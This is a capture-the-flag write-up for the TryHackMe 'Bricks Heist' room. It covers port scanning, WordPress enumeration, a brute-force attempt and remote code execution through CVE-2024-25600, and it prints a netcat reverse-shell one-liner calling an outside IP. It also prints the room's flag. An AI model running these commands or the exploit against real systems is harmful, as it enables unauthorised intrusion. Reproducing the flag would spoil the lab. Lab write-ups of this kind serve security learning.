# [Machine](https://tryhackme.com/room/tryhack3mbricksheist)

- # ENUM
	- ### nmap (`-A -p- -T4 bricks`)
		```nmap
		PORT      STATE    SERVICE  VERSION
		22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
		| ssh-hostkey: 
		|   3072 af:57:68:05:6a:12:77:30:9a:87:3e:1b:70:17:52:5e (RSA)
		|   256 8e:99:42:cc:49:5e:a6:24:01:49:c3:39:2b:61:12:6d (ECDSA)
		|_  256 36:82:26:21:ac:ae:01:99:2e:85:c7:64:0f:13:bf:bd (ED25519)
		80/tcp    open     http     Python http.server 3.5 - 3.10
		|_http-title: Error response
		|_http-server-header: WebSockify Python/3.8.10
		443/tcp   open     ssl/http Apache httpd
		| http-robots.txt: 1 disallowed entry 
		|_/wp-admin/
		|_http-server-header: Apache
		| tls-alpn: 
		|   h2
		|_  http/1.1
		|_ssl-date: TLS randomness does not represent time
		|_http-title: Brick by Brick
		|_http-generator: WordPress 6.5
		| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
		| Not valid before: 2024-04-02T11:59:14
		|_Not valid after:  2025-04-02T11:59:14
		2139/tcp  filtered ias-auth
		3306/tcp  open     mysql    MySQL (unauthorized)
		43424/tcp filtered unknown
		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
		```

- # EXPLOITATION
	- WordPress website again! Let's enumerate more with `wpscan` (`wpscan --url https://bricks.thm/ --disable-tls-checks`)
		- Found a user:  `administrator`
			- Tried bruteforce, but nothing (`wpscan --url https://bricks.thm/ --passwords /usr/share/wordlists/rockyou.txt --disable-tls-checks`)
	- The theme (bricks) is vulnerable to `CVE-2024-25600` ([remote code execution](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)). Let's run the script and get a shell!
		- Let's open another remote shell: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.212 8888 >/tmp/f`
		- `python -c "import pty; pty.spawn('/bin/bash')"`

- # CHECK FOR FLAGS
	- There's a suspicious process: "`ubuntu.service`" (`systemctl | grep running`)
		- `systemctl cat ubuntu.service`
		- `ExecStart=/lib/NetworkManager/nm-inet-dialog`
	- Log file: `/lib/NetworkManager/inet.conf`
	- `cat inet.conf | head`
		- `ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d` ---- ([Cyberchef](https://gchq.github.io/CyberChef/)) ---> `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
		- Let's search on the blockchain that address and his transactions
			- It belongs to the threat group "LockBit"!


- # FLAGS
	- `/data/www/default/650c844110baced87e1606453b93f22a.txt` -> `THM{fl46_650c844110baced87e1606453b93f22a}`
